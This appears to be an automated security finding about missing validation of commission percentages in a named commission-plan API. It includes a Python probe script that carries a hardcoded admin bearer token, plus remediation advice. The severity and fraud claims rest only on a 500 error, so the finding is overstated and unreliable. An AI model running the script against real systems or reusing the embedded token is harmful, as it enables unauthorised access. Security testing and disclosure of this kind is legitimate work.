# Business Logic Vulnerability: Commission Percentage Manipulation Allows Financial Fraud

**ID:** vuln-0025
**Severity:** HIGH
**Found:** 2026-02-26 18:52:10 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 8.8

## Description

A critical business logic vulnerability was discovered in the commission plan creation functionality that allows manipulation of commission percentages beyond reasonable business limits. The application fails to properly validate commission percentage values during commission plan creation, potentially allowing attackers to create commission plans with excessively high percentages.

This vulnerability enables financial fraud by allowing the creation of commission plans that calculate commissions at inflated rates, potentially leading to significant financial losses for the organization.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Financial Losses**: Creation of commission plans with excessively high percentages (e.g., 1000%) could result in massive payouts to sales representatives or partners
2. **Fraudulent Commission Schemes**: Attackers could create fraudulent commission plans to siphon money from the organization
3. **System Abuse**: Malicious insiders or compromised accounts could abuse this vulnerability to manipulate commission calculations
4. **Business Process Compromise**: The integrity of the entire commission management system could be compromised

The business impact includes direct financial losses from inflated commission payouts, reputational damage, and potential regulatory compliance violations.

## Technical Analysis

The vulnerability exists in the `/api/CommissionPlan/CreateCommissionPlan` endpoint. When creating a new commission plan, the application accepts a `commissionPercentage` parameter without proper validation of reasonable business limits.

**Technical Details:**
- Endpoint: `POST /api/CommissionPlan/CreateCommissionPlan`
- Parameter: `commissionPercentage`
- Vulnerability: Lack of proper input validation for commission percentage values
- Response: 500 Internal Server Error (indicating the application processes the input rather than rejecting it)

**Root Cause:**
The application appears to lack server-side validation for commission percentage values. While the current implementation returns a 500 error for extreme values (1000%), this suggests the validation is occurring at a lower level (e.g., database constraint) rather than through proper business logic validation.

**Exploitation Potential:**
- Attackers could test various percentage values to find the maximum acceptable limit
- Lower but still excessive percentages (e.g., 150%, 200%) might be accepted
- The vulnerability could be combined with other access control vulnerabilities to create fraudulent commission plans

## Proof of Concept

**Proof of Concept: Commission Percentage Manipulation**

1. Authenticate as a user with commission plan creation privileges
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with manipulated commission percentage
3. Observe the server response to determine acceptable percentage ranges

**Testing Methodology:**
1. Attempt to create commission plans with various percentage values:
   - Extremely high values (1000%, 999999%)
   - High but plausible values (150%, 200%, 300%)
   - Negative values (-10%, -100%)
   - Zero value (0%)
   - Decimal values (100.5%, 101.1%)

2. Monitor server responses to identify:
   - Which values are rejected with proper validation errors
   - Which values cause server errors (500)
   - Which values are accepted and stored

3. For accepted values, verify if they can be used in commission calculations

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Ottof1nFMG3jeGtyw"

# Test cases for commission percentage manipulation
TEST_CASES = [
    {"percentage": 1000, "description": "Extremely high percentage (1000%)"},
    {"percentage": 200, "description": "Double normal percentage (200%)"},
    {"percentage": 150, "description": "High percentage (150%)"},
    {"percentage": 101, "description": "Slightly above 100% (101%)"},
    {"percentage": 100.5, "description": "Decimal above 100% (100.5%)"},
    {"percentage": 0, "description": "Zero percentage (0%)"},
    {"percentage": -10, "description": "Negative percentage (-10%)"},
    {"percentage": -100, "description": "Large negative percentage (-100%)"}
]

def test_commission_percentage_manipulation():
    """Test commission percentage manipulation vulnerability"""
    url = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"
    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    results = []

    for test_case in TEST_CASES:
        payload = {
            "planName": f"Test Plan - {test_case['percentage']}%",
            "description": f"Test plan with {test_case['description']}",
            "commissionPercentage": test_case["percentage"],
            "startDate": "2024-01-01",
            "endDate": "2024-12-31",
            "isActive": True,
            "organizationId": 1,
            "clientId": 1
        }

        try:
            response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=10)
            results.append({
                "percentage": test_case["percentage"],
                "description": test_case["description"],
                "status_code": response.status_code,
                "response_length": len(response.content),
                "success": response.status_code == 200
            })
            print(f"Test {test_case['percentage']}%: Status {response.status_code}")

        except Exception as e:
            results.append({
                "percentage": test_case["percentage"],
                "description": test_case["description"],
                "status_code": "ERROR",
                "response_length": 0,
                "success": False,
                "error": str(e)
            })
            print(f"Test {test_case['percentage']}%: Error - {str(e)}")

    return results

def analyze_results(results):
    """Analyze test results to identify vulnerable percentage ranges"""
    print("\n=== COMMISSION PERCENTAGE MANIPULATION TEST RESULTS ===")
    print(f"{'Percentage':<12} {'Description':<40} {'Status':<10} {'Vulnerable':<10}")
    print("-" * 80)

    vulnerable_found = False

    for result in results:
        if result["status_code"] == "ERROR":
            status = "ERROR"
            vulnerable = "UNKNOWN"
        elif result["status_code"] == 200:
            status = "200 OK"
            vulnerable = "YES"
            vulnerable_found = True
        elif result["status_code"] == 500:
            status = "500 ERROR"
            vulnerable = "POTENTIAL"
        else:
            status = str(result["status_code"])
            vulnerable = "NO"

        print(f"{str(result['percentage']):<12} {result['description']:<40} {status:<10} {vulnerable:<10}")

    if vulnerable_found:
        print("\n⚠️  CRITICAL: Commission percentage manipulation vulnerability confirmed!")
        print("The application accepts commission percentages that exceed reasonable business limits.")
    else:
        print("\n✅ No direct commission percentage manipulation vulnerability detected.")
        print("However, the 500 errors suggest potential validation issues that should be investigated.")

if __name__ == "__main__":
    print("Testing commission percentage manipulation vulnerability...")
    results = test_commission_percentage_manipulation()
    analyze_results(results)
```

## Remediation

**Remediation Recommendations:**

1. **Implement Server-Side Validation for Commission Percentages:**
   - Add strict validation for commission percentage values
   - Define reasonable business limits (e.g., 0-100%)
   - Reject any values outside these limits with clear error messages
   - Consider configurable maximum limits for different business scenarios

2. **Implement Business Logic Validation:**
   - Add validation logic that understands business rules for commission percentages
   - Implement different validation rules for different commission plan types
   - Add approval workflows for commission plans with high percentages

3. **Add Input Sanitization:**
   - Sanitize all numeric inputs to prevent injection attacks
   - Validate decimal precision for percentage values
   - Reject negative values unless specifically allowed by business rules

4. **Implement Database Constraints:**
   - Add database-level constraints to prevent invalid values from being stored
   - Use appropriate data types with proper precision and scale
   - Consider using CHECK constraints to enforce business rules

5. **Add Comprehensive Logging and Monitoring:**
   - Log all commission plan creation attempts
   - Monitor for unusual commission percentage values
   - Alert on repeated attempts to create plans with excessive percentages

6. **Implement Role-Based Validation:**
   - Restrict commission plan creation to authorized roles
   - Add additional approval workflows for high-percentage plans
   - Implement segregation of duties for commission plan management

7. **Conduct Security Testing:**
   - Perform penetration testing to validate the remediation
   - Test edge cases and boundary conditions
   - Verify that all validation logic works as intended

**Example Implementation (Pseudocode):**

```csharp
// Commission plan creation validation
public bool ValidateCommissionPlan(CommissionPlan plan)
{
    // Validate commission percentage
    if (plan.CommissionPercentage < 0)
    {
        throw new ValidationException("Commission percentage cannot be negative");
    }

    if (plan.CommissionPercentage > 100)
    {
        // For percentages above 100%, require additional approval
        if (!plan.HasAdditionalApproval)
        {
            throw new ValidationException("Commission percentages above 100% require additional approval");
        }
    }

    // Additional business rule validation
    if (plan.CommissionPercentage > GetMaxAllowedPercentage(plan.PlanType))
    {
        throw new ValidationException($"Commission percentage exceeds maximum allowed for {plan.PlanType}");
    }

    return true;
}
```

